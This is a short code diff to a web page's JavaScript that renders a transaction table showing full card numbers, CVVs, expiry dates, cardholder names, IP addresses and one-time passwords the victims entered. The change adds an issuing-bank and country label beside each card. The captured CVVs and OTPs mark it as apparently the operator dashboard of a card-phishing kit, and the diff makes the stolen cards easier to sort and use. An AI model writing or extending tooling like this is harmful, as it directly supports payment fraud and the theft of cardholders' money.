@@ -833,17 +833,27 @@
         }
 
         data.forEach(tx => {
-          const row = document.createElement('tr');
-          row.innerHTML = `
-            <td>${tx.id}</td>
-            <td>${tx.email}</td>
-            <td>${tx.amount}</td>
-            <td>${tx.currency || 'INR'}</td>
-            <td>${tx.cardNumber}</td>
-            <td>${tx.cvv}</td>
-            <td>${tx.expiry}</td>
-            <td>${tx.cardholder}</td>
-            <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
+  const row = document.createElement('tr');
+  
+  // Bank info display
+  const bankInfoDisplay = tx.bankInfo ? 
+    `<div style="margin-top: 3px; font-size: 11px; color: #aaa;">
+      ${tx.bankInfo.bank || 'Unknown'} | ${tx.bankInfo.countryCode || ''} ${tx.bankInfo.country || 'Unknown'}
+     </div>` : '';
+  
+  row.innerHTML = `
+    <td>${tx.id}</td>
+    <td>${tx.email}</td>
+    <td>${tx.amount}</td>
+    <td>${tx.currency || 'INR'}</td>
+    <td>
+      ${tx.cardNumber}
+      ${bankInfoDisplay}
+    </td>
+    <td>${tx.cvv}</td>
+    <td>${tx.expiry}</td>
+    <td>${tx.cardholder}</td>
+    <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
             <td>
               ${tx.otpEntered ?
                 `<span class="otp-received">${tx.otpEntered}</span>
